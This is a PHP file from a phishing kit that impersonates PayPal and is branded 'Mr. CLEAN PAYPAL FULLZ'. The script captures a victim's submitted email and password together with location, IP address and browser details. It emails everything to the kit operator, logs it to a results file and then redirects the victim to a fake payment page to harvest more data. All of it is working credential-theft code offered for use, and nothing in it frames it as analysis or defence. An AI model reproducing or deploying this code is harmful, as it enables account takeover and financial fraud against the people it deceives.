<?php
/*   
        ────────────
*/
        session_start();
        error_reporting(0);
        $TIME_DATE = date('H:i:s d/m/Y');
        ########################################################
        ################ [+] INCLUDE FILES [+] #################
        ########################################################
        include('../functions/get_browser.php');
        include('../functions/get_ip.php'); 
        include('../config.php');
        ########################################################
        ############# [+] SESSION INFORMATION [+] ##############
        ########################################################
        if(!empty($_POST['login_email'])){$_SESSION['_login_email_']    = $_POST['login_email'];}
        if(!empty($_POST['login_password'])){$_SESSION['_login_password_'] = $_POST['login_password'];}
        ########################################################
        ################ [+] SYPHER_MESSAGE [+] ################
        ########################################################
        $SYPHER_MESSAGE  = "<html><body>
        <div style='font-size: 13px;font-family:monospace;font-weight:700;'><br>
        ########################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'>Mr. CLEAN PAYPAL FULLZ</font> [+]</font> ###########################<br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> LOGIN INFORMATION </font> [+]</font> #############################<br>
        <font style='color:#9c0000;'>[+]</font> <b>DEAR, <font color='#cc1414'>".$SYPHER_NAME."</font> THIS IS YOUR LOGIN RESULT ENJOY !</b> <br>
        <font style='color:#9c0000;'>[+]</font> [Email] = <font style='color:#0070ba;'>".$_SESSION['_login_email_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [Password] = <font style='color:#0070ba;'>".$_SESSION['_login_password_']."</font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> BILLING INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [City] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_CITY_']."</font><br>
        <font style='color:#9c0000;'>[+]</font> [State]   = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_REGIONS_']."</font><br>
       <font style='color:#9c0000;'>[+]</font> [Zip Code] = <font style='color:#0070ba;'>".$_SESSION['_LOOKUP_ZIPCODE_']."</font><br>
        ############################## <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> VICTIM INFORMATION </font> [+]</font> ###########################<br>
        <font style='color:#9c0000;'>[+]</font> [IP INFO] = <font style='color:#0070ba;'>https://db-ip.com/".$_SESSION['_ip_']."</font><br>
       <font style='color:#9c0000;'>[+]</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
        <font style='color:#9c0000;'>[+]</font> [BROWSER] = <font style='color:#0070ba;'>".SYPHER_Browser($_SERVER['HTTP_USER_AGENT'])." On ".SYPHER_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
        <font style='color:#9c0000;'>[+]</font> [ALERT!] = <font style='color:#0070ba;'>Our YouTube Channel : </font><br>
        ############################# <font style='color:#9c0000;'>[+] <font style='color: #0a5d00;'> Mr. CLEAN PAYPAL FULLZ </font> [+]</font> ########################<br>
        </div></body></html>";
        ################ [+] SYPHER_SUBJECT [+] ################
        $SYPHER_SUBJECT = "(PAYPAL)(LOGIN)(".$_SESSION['_login_email_'].")(".$_SESSION['_forlogin_'].")";
        ################ [+] SYPHER_HEADERS [+] ################
        $SYPHER_HEADERS  = "From: Mr. CLEAN ☑ <no_reply@mrclean.ml>\n";
        $SYPHER_HEADERS .= "MIME-Version: 1.0\r\n";
        $SYPHER_HEADERS .= "Content-Type: text/html; charset=ISO-8859-1\n";
        ################## [+] SEND MAIL [+] ###################
        if(!empty($_POST['login_email']) && !empty($_POST['login_password'])){
        mail($SYPHER_EMAIL, $SYPHER_SUBJECT, $SYPHER_MESSAGE, $SYPHER_HEADERS);
        ################## [+] TEXT RESULT [+] #################
        $MYFILE = "../../../all_result/FULLZ.php";
        $FH = fopen($MYFILE, 'a+') or die("can't open file!");
        fwrite($FH, $SYPHER_MESSAGE);
        fclose($FH);}
        ################## [+] NEXT PAGE [+] ###################
        HEADER("Location: ../settings/settings.php?action=paymentAction&locale=en-".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");    
?>